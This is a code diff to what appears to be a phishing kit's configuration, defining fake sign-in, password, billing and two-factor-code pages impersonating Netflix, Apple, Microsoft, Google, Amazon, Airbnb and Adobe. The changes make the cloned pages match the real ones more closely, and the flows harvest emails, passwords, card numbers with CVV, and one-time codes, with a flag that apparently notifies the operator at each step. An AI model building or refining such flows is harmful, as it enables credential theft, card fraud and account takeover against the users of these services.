@@ -733,7 +733,7 @@ FLOWS.spotify = [
 ];
 
 FLOWS.netflix = [
-  { slug:'login',          form_type:'login',  page_title:'Sign In – Netflix',  headline:'Sign in to Netflix',            subheadline:'Enter your email and password',  fields:['email','password'],                          layout:'auth',  cta:'Sign In',   step_label:'Login',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Sign In – Netflix',  headline:'Sign in to Netflix',            subheadline:'',  fields:['email','password'],                          layout:'auth',  cta:'Sign In',   step_label:'Login',          notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Billing',     headline:'Update Billing Details',        subheadline:'To restore Netflix access, update your payment details', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
 ];
 
@@ -1520,24 +1520,25 @@ FLOWS.sendgrid = [
 
 // ── Tech ──────────────────────────────────────────────────────────────────────
 FLOWS.apple = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Apple ID',       headline:'Sign in with Apple ID', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Your Apple ID is protected with two-factor authentication. Enter the verification code displayed on your other devices to sign in.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Sign In – Apple ID',       headline:'Sign in with your Apple ID', subheadline:'', fields:['apple_id'], layout:'auth', cta:'Continue', step_label:'Apple ID', notify_step:true  },
+  { slug:'password', form_type:'login', page_title:'Sign In – Apple ID',       headline:'Sign in with your Apple ID', subheadline:'', fields:['password'], layout:'auth', cta:'Continue', step_label:'Password', notify_step:true  },
+  { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the six-digit verification code displayed on your other devices to sign in.', fields:['code'], layout:'otp', cta:'Continue', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.microsoft = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Microsoft',      headline:'Sign in',              subheadline:'to continue to Microsoft', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Microsoft',      headline:'Sign in',              subheadline:'to continue to Microsoft', fields:['email_phone_skype'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Password',           headline:'Enter password',       subheadline:'', fields:['password'], layout:'auth', cta:'Sign in',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Help us protect your account', subheadline:'We need to verify your identity to let you sign in', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.google = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Google',         headline:'Sign in',              subheadline:'Use your Google Account', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Google',         headline:'Sign in',              subheadline:'Use your Google Account', fields:['email_or_phone'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Welcome',                  headline:'Welcome',              subheadline:'', fields:['password'], layout:'auth', cta:'Next',     step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'2-Step Verification',      headline:'2-Step Verification',  subheadline:'Google sent a verification code to your phone', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.amazon = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Amazon',         headline:'Sign in',              subheadline:'New to Amazon? Create your Amazon account', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Amazon Sign-In',           headline:'Sign-In',              subheadline:'', fields:['email_or_mobile'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Your Password',      headline:'Enter your password',  subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Step Verification',    headline:'Two-Step Verification', subheadline:'Enter the one-time password (OTP) sent to your phone', fields:['code'], layout:'otp', cta:'Sign In', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
@@ -1548,7 +1549,7 @@ FLOWS.meta = [
 ];
 
 FLOWS.airbnb = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Airbnb',          headline:'Log in to Airbnb',     subheadline:'', fields:['email','password'], layout:'auth', cta:'Continue', step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log In – Airbnb',          headline:'Log in or sign up',    subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Confirm Your Identity',    headline:'Confirm your identity', subheadline:'Enter the code we just sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1568,7 +1569,7 @@ FLOWS.zoom = [
 ];
 
 FLOWS.adobe = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Adobe',          headline:'Sign in with Adobe',   subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Adobe',          headline:'Sign in',              subheadline:'', fields:['email'], layout:'auth', cta:'Continue', step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Password',           headline:'Enter your password',  subheadline:'', fields:['password'], layout:'auth', cta:'Continue', step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify your identity', subheadline:'Enter the verification code sent to your phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
